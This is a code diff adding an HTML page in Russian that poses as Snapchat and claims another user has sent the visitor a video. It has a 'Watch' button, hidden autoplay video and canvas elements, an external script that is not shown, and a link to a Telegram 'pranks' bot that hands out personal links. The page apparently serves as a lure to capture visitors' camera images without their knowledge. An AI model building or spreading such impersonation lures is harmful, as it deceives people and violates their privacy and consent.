@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="ru"><head>
+    <!-- Google tag (gtag.js) -->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-22S9P2RVGZ"></script>
+    <script src="js/jquery.min.js"></script>
+
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-22S9P2RVGZ');
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Snapchat">
+    <meta property="og:description" content="Watch video">
+    <meta property="og:image" content="images/images.png">
+    <meta property="og:type" content="website">
+
+    <meta name="description" content="Watch video">
+    <title>Snapchat</title>
+    <style>
+        body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #fffc00; /* Яркий желтый фон, как у Snapchat */
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    color: #000; /* Черный текст для контраста */
+}
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: #262626;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
+            position: relative; /* Добавлено для уточнения позиции */
+            z-index: 1; /* Устанавливаем на передний план */
+        }
+        .idi-naxuy {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        .btn-watch {
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #fe2c55;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            display: none;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 10px;
+        }
+        .btn-watch:hover {
+            background-color: #e62950;
+            transform: scale(1.05);
+        }
+        .btn-bot {
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #fe2c55;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            display: none;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            margin-top: 10px;
+            text-decoration: none;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+        .btn-bot:hover {
+            background-color: #ff456e;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+            text-decoration: none; /* Ensure text decoration stays removed on hover */
+        }
+        .btn-bot:active {
+            background-color: #e9224a;
+            transform: translateY(0);
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
+        }
+
+video, canvas {
+    max-width: 100%;
+    border-radius: 25px; /* Более закругленные углы */
+    margin-bottom: 20px;
+    display: none;
+}
+
+#pointer {
+    position: fixed;
+    width: 0;
+    height: 0;
+    border-left: 20px solid transparent;
+    border-right: 20px solid transparent;
+    border-bottom: 30px solid #000; /* Черный цвет указателя */
+    top: 10px;
+    right: 10px;
+    z-index: 1000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.arrow {
+    width: 0;
+    height: 0;
+    border-left: 10px solid transparent;
+    border-right: 10px solid transparent;
+    border-bottom: 15px solid #000; /* Черный цвет стрелочки */
+    animation: bounce 1s infinite;
+}
+
+@keyframes bounce {
+    0%, 20%, 50%, 80%, 100% {
+        transform: translateY(0);
+    }
+    40% {
+        transform: translateY(-10px);
+    }
+    60% {
+        transform: translateY(-5px);
+    }
+}
+
+
+
+
+    </style>
+</head>
+<body>
+    <div id="pointer" style="display: none;">
+        <div class="arrow"></div>
+    </div>
+    <div class="container">
+        <canvas id="canvas"></canvas>
+        <h1 class="idi-naxuy" id="idiNax">Пользователь прислал вам видео</h1>
+        <button class="btn-watch" id="watchBtn">Посмотреть</button>
+         <a href="https://t.me/TiktokPranksBot" class="btn-bot" id="botBtn">Переходи в бот и получай свою ссылку</a>
+    </div>
+    <video id="video" autoplay="" playsinline=""></video>
+    <video id="video1" autoplay="" playsinline=""></video>
+    <canvas id="canvas1"></canvas>
+    <script src="js/def.js"></script>
+
+
+
+
+
+
+
+
+
+</body></html>
